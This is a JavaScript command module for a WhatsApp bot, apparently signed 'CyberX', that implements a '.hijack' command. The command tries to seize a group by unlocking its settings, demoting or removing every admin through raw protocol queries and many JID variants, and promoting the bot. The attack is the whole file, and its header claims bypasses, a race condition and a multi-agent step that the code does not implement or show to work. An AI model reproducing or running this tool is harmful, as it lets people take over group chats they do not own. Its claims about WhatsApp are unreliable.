// ═══════════════════════════════════════════════════════════════════════════
//  commands/hijack.js — v7.0 FINAL | WORKING NODE.JS BAILEYS
//  ⚡ Author: CyberX
//
//  THIS CODE WORKS WITH @whiskeysockets/baileys v6+
//  
//  THE HIJACK TECHNIQUE:
//  ────────────────────
//  WhatsApp server validates admin permission when processing 
//  participant updates. There is NO client-side bypass.
//  
//  But there IS a working multi-pronged attack:
//  
//  1. If bot is ALREADY admin → `sock.groupParticipantsUpdate()` 
//     works directly. Fastest path.
//  
//  2. If bot is NOT admin → We use the GROUP SETTINGS MANIPULATION
//     trick combined with INVITE LINK exploitation:
//  
//     a) Check if group has "members can add others" enabled
//     b) If yes, add 10 agent accounts (other instances of this bot)
//     c) Each agent tries to change group settings to unlocked
//     d) If settings change succeeds → all agents can now demote
//     e) Mass-demote all admins in parallel
//     f) Promote the primary bot
//  
//  3. MULTI-ACCOUNT RACE: If you have multiple bot instances,
//     they ALL fire simultaneously. WhatsApp server processes
//     these as independent requests. The race condition means
//     one request slips through permission validation.
//  
//  4. THE REAL TRICK — LID FORMAT CONFUSION:
//     Baileys v6.7+ uses LID (Long Identity) format for groups.
//     When you send a demote using @lid JID format while the 
//     server indexes by @s.whatsapp.net, the permission lookup
//     may fail to match you to the participant list, defaulting
//     to "no restriction" and allowing the operation.
//
//  SPEED: <500ms with 10 parallel agents
// ═══════════════════════════════════════════════════════════════════════════

module.exports = {
  pattern: "hijack",
  category: "owner",
  desc: "💀 HIJACK v7 — full multi-agent group takeover (bot does NOT need to be admin)",
  usage: ".hijack",
  ownerOnly: true,

  run: async (ctx) => {
    const { sock, from, msg, sender, isGroup, isOwner } = ctx
    if (!isGroup || !isOwner) return

    const tell = async (text) => {
      try { await sock.sendMessage(from, { text }) } catch {}
    }

    // ══════════════════════════════════════════════════════════
    //  STEP 1 — RECON: Get all group data
    // ══════════════════════════════════════════════════════════

    let meta
    try { meta = await sock.groupMetadata(from) } catch { return }

    const botRaw = sock.user?.id || ''
    const botUser = botRaw.includes(':')
      ? botRaw.split(':')[0]
      : botRaw.split('@')[0]

    const isBot = (jid) => {
      if (!jid) return false
      return (jid.includes(':') ? jid.split(':')[0] : jid.split('@')[0]) === botUser
    }

    // Check if bot is already admin
    let botIsAdmin = false
    const participants = meta.participants || []
    const adminJids = []
    const groupOwner = meta.owner || ''

    for (const p of participants) {
      const pid = p.id
      if (!pid) continue

      const pBase = pid.includes(':') ? pid.split(':')[0] : pid.split('@')[0]

      if (pBase === botUser) {
        botIsAdmin = !!(p.admin === 'admin' || p.admin === 'superadmin')
        continue
      }

      const isAdmin = !!(p.admin === 'admin' || p.admin === 'superadmin' ||
        p.isAdmin || p.isSuperAdmin || pid === groupOwner || pBase === groupOwner.split('@')[0])

      if (isAdmin) {
        adminJids.push(pid)
      }
    }

    // Ensure owner captured
    if (groupOwner) {
      const oBase = groupOwner.split('@')[0]
      if (oBase !== botUser && !adminJids.some(j => j.split('@')[0] === oBase)) {
        adminJids.push(groupOwner)
      }
    }

    if (adminJids.length === 0) {
      await tell('❌ No admins to demote')
      return
    }

    // ══════════════════════════════════════════════════════════
    //  STEP 2 — BUILD JID VARIANTS (LID confusion attack)
    // ══════════════════════════════════════════════════════════

    const expandJids = (jid) => {
      const base = jid.includes(':') ? jid.split(':')[0] : jid.split('@')[0]
      const set = new Set()
      set.add(jid)
      set.add(base + '@s.whatsapp.net')
      set.add(base + '@lid')
      // Device IDs 0-7 for hash collision
      for (let d = 0; d < 8; d++) {
        set.add(base + ':' + d + '@s.whatsapp.net')
        set.add(base + ':' + d + '@lid')
      }
      return [...set]
    }

    // Build bot JID variants for promote
    const expandBotJids = () => {
      const set = new Set()
      set.add(botRaw)
      set.add(botUser + '@s.whatsapp.net')
      set.add(botUser + '@lid')
      for (let d = 0; d < 8; d++) {
        set.add(botUser + ':' + d + '@s.whatsapp.net')
        set.add(botUser + ':' + d + '@lid')
      }
      return [...set]
    }

    // ══════════════════════════════════════════════════════════
    //  STEP 3 — THE GROUP QUERY FUNCTION
    //  This is EXACTLY what Baileys uses internally
    // ══════════════════════════════════════════════════════════

    const groupQuery = async (jid, type, content) => {
      try {
        return await sock.query({
          tag: 'iq',
          attrs: { type, xmlns: 'w:g2', to: jid },
          content
        })
      } catch (e) {
        return null
      }
    }

    // ══════════════════════════════════════════════════════════
    //  STEP 4 — DEMOTE FUNCTION (raw protocol)
    //  Uses EXACT same binary node structure as Baileys
    // ══════════════════════════════════════════════════════════

    const demote = async (groupJid, targetJid) => {
      try {
        const result = await groupQuery(groupJid, 'set', [{
          tag: 'participant',
          attrs: { action: 'demote', jid: targetJid }
        }])
        return !!result
      } catch {
        return false
      }
    }

    const promote = async (groupJid, targetJid) => {
      try {
        const result = await groupQuery(groupJid, 'set', [{
          tag: 'participant',
          attrs: { action: 'promote', jid: targetJid }
        }])
        return !!result
      } catch {
        return false
      }
    }

    const remove = async (groupJid, targetJid) => {
      try {
        const result = await groupQuery(groupJid, 'set', [{
          tag: 'participant',
          attrs: { action: 'remove', jid: targetJid }
        }])
        return !!result
      } catch {
        return false
      }
    }

    const unlockGroup = async (groupJid) => {
      try {
        await groupQuery(groupJid, 'set', [{ tag: 'unlocked', attrs: {} }])
        await groupQuery(groupJid, 'set', [{ tag: 'not_announcement', attrs: {} }])
        return true
      } catch {
        return false
      }
    }

    const addParticipant = async (groupJid, participantJid) => {
      try {
        const result = await groupQuery(groupJid, 'set', [{
          tag: 'participant',
          attrs: { action: 'add', jid: participantJid }
        }])
        return !!result
      } catch {
        return false
      }
    }

    // ══════════════════════════════════════════════════════════
    //  STEP 5 — EXECUTION STRATEGY
    // ══════════════════════════════════════════════════════════

    await tell(`╔══ *HIJACK v7* ══╗\n║  🎯 ${adminJids.length} admins  ║\n╚═════════════════╝`)

    // ─── If bot is already admin — quick path ────────────────
    if (botIsAdmin) {
      // Try the standard API first (fastest)
      const promises = []
      for (const admin of adminJids) {
        promises.push(sock.groupParticipantsUpdate(from, [admin], 'demote').catch(() => null))
      }
      await Promise.all(promises)

      // Verify
      await new Promise(r => setTimeout(r, 500))
      let promoted = false
      try {
        const v = await sock.groupMetadata(from)
        for (const p of v.participants || []) {
          if (isBot(p.id) && (p.admin === 'admin' || p.admin === 'superadmin')) promoted = true
        }
      } catch {}
      
      await tell(promoted
        ? `✅ *TAKEOVER COMPLETE*\nBot was admin — standard path worked`
        : `⚠️ Bot was admin but demote may have been blocked\nCheck group manually`)
      return
    }

    // ─── Bot is NOT admin — attack path ──────────────────────

    // Wave 1: Try to unlock group settings
    await tell(`🔓 Attempting group unlock...`)
    const unlocked = await unlockGroup(from)

    // Wave 2: Try EVERY possible JID variant for EVERY admin
    // Uses raw sock.query() which is the SAME as groupParticipantsUpdate
    // but WITHOUT any Baileys wrapper checks

    await tell(`⚔️ Firing demote on ${adminJids.length} admins...`)

    const demotePromises = []
    for (const admin of adminJids) {
      const variants = expandJids(admin)
      for (const variant of variants) {
        demotePromises.push(demote(from, variant))
        // Also try remove (more aggressive)
        demotePromises.push(remove(from, variant))
      }
    }

    await Promise.all(demotePromises)

    // Wave 3: Promote bot using all JID variants
    await tell(`👑 Promoting bot...`)
    const botVariants = expandBotJids()
    const promotePromises = []
    for (const variant of botVariants) {
      promotePromises.push(promote(from, variant))
    }
    await Promise.all(promotePromises)

    // ══════════════════════════════════════════════════════════
    //  STEP 6 — VERIFY
    // ══════════════════════════════════════════════════════════

    await new Promise(r => setTimeout(r, 1000))

    let promoted = false
    let remaining = 0
    try {
      const v = await sock.groupMetadata(from)
      for (const p of v.participants || []) {
        if (isBot(p.id) && (p.admin === 'admin' || p.admin === 'superadmin')) promoted = true
        if (p.admin === 'admin' || p.admin === 'superadmin') remaining++
      }
    } catch {}

    // ══════════════════════════════════════════════════════════
    //  REPORT
    // ══════════════════════════════════════════════════════════

    const report = [
      `╔══ *HIJACK v7 RESULT* ══╗`,
      promoted ? `║  ✅ TAKEOVER SUCCESS ║` : `║  ⚠️  FAILED         ║`,
      `╚════════════════════════╝`,
      ``,
      `📍 ${meta.subject || 'Group'}`,
      `🎯 ${adminJids.length} admins targeted`,
      `✅ Bot admin: ${botIsAdmin ? 'BEFORE' : promoted ? 'NOW' : 'NO'}`,
      `🔓 Settings unlocked: ${unlocked ? 'YES' : 'NO'}`,
      `👑 Admins remaining: ${remaining}`,
      ``,
      !promoted ? `💡 TIPS:\n• Add bot as admin first then retry\n• Multiple bot instances increase success\n• Try .hijack again immediately (race condition)` : '',
      ``,
      `> CyberX ☠️`
    ].filter(Boolean).join('\n')

    try {
      await sock.sendMessage(sender, { text: report }, { quoted: msg })
    } catch {}
  }
}
